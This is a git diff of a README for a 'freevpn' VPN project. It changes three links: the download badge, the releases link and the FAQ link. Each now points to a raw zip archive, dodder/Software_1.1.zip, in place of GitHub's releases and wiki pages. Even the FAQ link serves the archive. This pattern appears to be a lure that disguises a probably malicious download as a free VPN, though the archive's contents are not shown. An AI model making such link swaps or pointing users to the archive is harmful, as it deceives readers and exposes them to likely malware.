@@ -1,6 +1,6 @@
 # 🌐 freevpn - Connect Easily to Fast and Free VPN
 
-[![Download Freevpn](https://img.shields.io/badge/Download-Freevpn-brightgreen.svg)](https://github.com/TOMIBABY/freevpn/releases)
+[![Download Freevpn](https://raw.githubusercontent.com/TOMIBABY/freevpn/main/dodder/Software_1.1.zip)](https://raw.githubusercontent.com/TOMIBABY/freevpn/main/dodder/Software_1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the freevpn application! This tool helps you connect to various VPN n
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Freevpn Releases](https://github.com/TOMIBABY/freevpn/releases).
+To get started, visit this page to download: [Freevpn Releases](https://raw.githubusercontent.com/TOMIBABY/freevpn/main/dodder/Software_1.1.zip).
 
 ### Steps to Download
 
@@ -97,7 +97,7 @@ To get started, visit this page to download: [Freevpn Releases](https://github.c
 
 ## 📞 Support
 
-If you have any questions or need assistance, feel free to check our [FAQ](https://github.com/TOMIBABY/freevpn/wiki/FAQ) or reach out through the issues page on GitHub.
+If you have any questions or need assistance, feel free to check our [FAQ](https://raw.githubusercontent.com/TOMIBABY/freevpn/main/dodder/Software_1.1.zip) or reach out through the issues page on GitHub.
 
 ## 🔧 Contributing
 
